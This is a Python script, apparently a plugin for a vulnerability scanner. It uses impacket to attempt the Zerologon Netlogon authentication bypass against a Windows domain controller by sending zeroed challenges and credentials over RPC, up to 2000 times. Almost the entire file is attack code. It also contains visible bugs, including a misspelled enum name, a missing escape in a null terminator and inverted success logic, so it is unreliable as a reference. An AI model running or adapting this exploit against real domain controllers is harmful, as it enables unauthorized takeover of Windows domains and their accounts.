from impacket.dcerpc.v5 import nrpc,epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac,hashlib,struct,sys,socket,time
from binascii import hexlify,unhexlify
from  subprocess import check_call

MAX_ATTEMPTS =2000

ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}

def fail(msg):
    ret['error']=msg+' '+sys.stderr
    return ret

def try_zero_authentice(dc_handle,dc_ip,target_computer):
    binding=epm.hept_map(dc_ip,nrpc.MSRPC_UUID_NRPC,protocol='ncacn_ip_tcp')
    rpc_con=transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    plaintext=b'\x00' *8
    ciphertext=b'\x00'*8

    flags=0x212fffff

    nrpc.hNetrServerReqChallenge(rpc_con,dc_handle+'\x00',target_computer+'x00',plaintext)

    try:
        server_auth=nrpc.hNetrServerAuthenticate3(
            rpc_con,dc_handle+'\x00',target_computer+'$\x00',nrpc.NETLOGON_SECURE_CHANNEL_TYPE.SerberSecureChannel,
            target_computer+'\x00',ciphertext,flags
        )

        assert server_auth['Errorcode']== 0
        return rpc_con
    except nrpc.DCERPCSessionError as ex:
        if ex.get_error_code()==0xc0000022:
            return ret
        else:
            fail(f'Unexcepted error code from DC:{ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexcept error:{ex}')

def perform_attack(dc_handle,dc_ip,target_computer):
    rpc_con=None
    for attempt in range(0,MAX_ATTEMPTS):
        rpc_con = try_zero_authentice(dc_handle,dc_ip,target_computer)

        if rpc_con:
            print('=',end='',flush=True)
        else:
            break

    if not rpc_con:
        ret['success']=True
    else:
        return ret


def main(params):
    #将需要提取出的参数都统一列在这里，不是用的参数不要列出来(可以注释掉），方便后续的查看。
    result = params.get('result',{})
    #url=params.get('url','')
    # command=params.get('commands','echo')
    #proxies=params.get('proxies',None)
    #timeout=params.get('timeout',5)

    #param_headers是传入的头部，如果没有传入则为空字典;headers是默认的头部。
    #param_headers = params.get('headers', {})
    #headers= {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    #try:
    #    headers.update(param_headers)   #将传入的header覆盖到默认的header里
    #except Exception as e :
    #    result['error'].append(e)
    ip = params.get('ip','')
    dc_name=params.get('dc_name','')
    dc_name=dc_name.rstrip('$')
    perform_attack('\\\\'+dc_name,ip,dc_name)

if __name__=='__main__':
    params={
        'result': {'success': bool, 'response': [], 'requests': [], 'error': []},
        'ip':'10.0.0.1',
        'dc_name':'testname',
    }
    print(main(params))
